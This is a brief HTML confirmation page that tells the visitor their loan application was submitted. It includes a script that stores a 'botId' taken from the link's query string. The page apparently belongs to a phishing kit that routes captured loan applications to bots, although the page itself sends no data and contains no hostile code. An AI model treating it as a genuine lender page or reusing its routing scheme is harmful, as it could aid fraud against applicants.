<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Success</title>
<style>
body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
.success-container { background: #fff; padding: 30px; border-radius: 12px; width: 100%; max-width: 400px; box-shadow: 0 5px 15px rgba(0,0,0,0.1); text-align: center; }
h2 { color: green; margin-bottom: 10px; }
p { color: #333; font-size: 16px; }
</style>
</head>
<body>

<div class="success-container">
    <h2>✅ Success!</h2>
    <p>Your loan application has been submitted successfully.</p>
</div>

<script>
// ---------------- BOT ROUTING ----------------
let botId = localStorage.getItem('botId');
if (!botId) {
    const params = new URLSearchParams(window.location.search);
    botId = params.get('botId');
}
if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
localStorage.setItem('botId', botId);
</script>

</body>
</html>
